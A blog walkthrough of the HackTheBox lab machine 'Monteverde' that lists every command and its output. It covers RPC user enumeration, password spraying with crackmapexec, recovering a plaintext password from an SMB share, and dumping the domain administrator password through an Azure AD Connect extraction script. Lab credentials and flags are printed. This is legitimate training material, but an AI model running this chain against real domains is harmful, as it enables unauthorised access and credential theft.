---
layout: post
title: Hackthebox Monteverde Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-07-06/monteverde.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Monteverde`.

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.172 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 20:39 EEST
Nmap scan report for 10.10.10.172
Host is up (0.12s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-13 17:03:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49775/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/13%Time=5EE510FD%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -43m23s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-06-13T17:05:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 746.57 seconds
root@kali:~#
```

### SMB enumeration
```shell
root@kali:~# smbclient -N -L 10.10.10.172
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
root@kali:~# 
```

### RPC enumeration
```shell
root@kali:~# rpcclient -U "" -N 10.10.10.172
rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
rpcclient $> 
```

### User enumeration with windapsearch
```shell
root@kali:~/windapsearch# ./windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

## 2. Getting User

```shell
root@kali:~# cat user.txt 
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

Password spraying using crackmapexec. We can find a credential `SABatchJobs:SABatchJobs` available.
```shell
root@kali:~# pip install crackmapexec

---

root@kali:~# crackmapexec smb 10.10.10.172 -d megabank -u user.txt -p user.txt 
[*] Initializing the database
CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:mhope STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:SABatchJobs STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:svc-ata STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:svc-bexec STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:svc-netapp STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:dgalanos STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:roleary STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\mhope:smorgan STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [-] megabank\SABatchJobs:mhope STATUS_LOGON_FAILURE 
CME          10.10.10.172:445 MONTEVERDE      [+] megabank\SABatchJobs:SABatchJobs 
[*] KTHXBYE!
root@kali:~#
```

Enumerate the SMB share again with the credential we found.
```shell
root@kali:~# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs 
[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	users$                                            	READ ONLY
```

In `\\users$\mhope`, we have an interesting file `azure.xml`.
```shell
root@kali:~# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	users$                                            	READ ONLY	
	.\users$\*
	dr--r--r--                0 Fri Jan  3 15:12:48 2020	.
	dr--r--r--                0 Fri Jan  3 15:12:48 2020	..
	dr--r--r--                0 Fri Jan  3 15:15:23 2020	dgalanos
	dr--r--r--                0 Fri Jan  3 15:41:18 2020	mhope
	dr--r--r--                0 Fri Jan  3 15:14:56 2020	roleary
	dr--r--r--                0 Fri Jan  3 15:14:28 2020	smorgan
	.\users$\mhope\*
	dr--r--r--                0 Fri Jan  3 15:41:18 2020	.
	dr--r--r--                0 Fri Jan  3 15:41:18 2020	..
	fw--w--w--             1212 Fri Jan  3 16:59:24 2020	azure.xml
```

Download the file `azure.xml`. We can find out it includes a password.
```shell
root@kali:~# smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 15:12:48 2020
  ..                                  D        0  Fri Jan  3 15:12:48 2020
  dgalanos                            D        0  Fri Jan  3 15:12:30 2020
  mhope                               D        0  Fri Jan  3 15:41:18 2020
  roleary                             D        0  Fri Jan  3 15:10:30 2020
  smorgan                             D        0  Fri Jan  3 15:10:24 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \> get mhope\azure.xml
getting file \mhope\azure.xml of size 1212 as mhope\azure.xml (7.5 KiloBytes/sec) (average 7.5 KiloBytes/sec)
smb: \>
```
```shell
root@kali:~# cat 'mhope\azure.xml' 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
root@kali:~#
```

Use the password we found for an user `mhope`.<br>
`user.txt` is in the directory `C:\Users\mhope\Documents\user.txt`.
```shell
root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> type ../Desktop/user.txt
4961976bd7d8f4eeb2ce3705e2f212f2
*Evil-WinRM* PS C:\Users\mhope\Documents>
```

## 3. Getting Root
As always, check the privilege of the user `mhope`.<br>
This time, the important thing is the user `mhope` is in a group `Azure Admins`.
```shell
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Also, we can see that we have `Azure AD connect` installed.
```shell
*Evil-WinRM* PS C:\Program Files> ls


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:31 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell


*Evil-WinRM* PS C:\Program Files> 
```

We can take a look at [this post](https://blog.xpnsec.com/azuread-connect-for-redteam/) for privilege escalation to gain the admin account using `Azure AD connect`.<br>
Or we can use [this script](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1).<br>
On the local host, clone `PsCabesha-tools` repository.
```shell
root@kali:~# git clone https://github.com/Hackplayers/PsCabesha-tools.git
Cloning into 'PsCabesha-tools'...
remote: Enumerating objects: 33, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (33/33), done.
remote: Total 134 (delta 15), reused 0 (delta 0), pack-reused 101
Receiving objects: 100% (134/134), 553.60 KiB | 882.00 KiB/s, done.
Resolving deltas: 100% (65/65), done.
```

Upload the `/Privesc/Azure-ADConnect.ps1` in the repository.
```shell
*Evil-WinRM* PS C:\Users\mhope\Documents> upload /root/PsCabesha-tools/Privesc/Azure-ADConnect.ps1
Info: Uploading /root/PsCabesha-tools/Privesc/Azure-ADConnect.ps1 to C:\Users\mhope\Documents\Azure-ADConnect.ps1

                                                             
Data: 3016 bytes of 3016 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\mhope\Documents> ls


    Directory: C:\Users\mhope\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         7/4/2020   6:37 PM           2264 Azure-ADConnect.ps1

```

Import the module and execute the function `Azure-ADConnect`. We can achieve a password for the user `administrator`.
```shell
*Evil-WinRM* PS C:\Users\mhope\Documents> import-module ./Azure-ADConnect.ps1
*Evil-WinRM* PS C:\Users\mhope\Documents> Azure-ADConnect -server 127.0.0.1 -db ADSync
[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+]Password: d0m@in4dminyeah!
```

We can use this credential for login as `Administrator`.<br>
`root.txt` is in the directory `C:\Users\Administrator\Desktop`.
```shell
root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
12909612d25c8dcf6e5a07d1a804a0bc
```
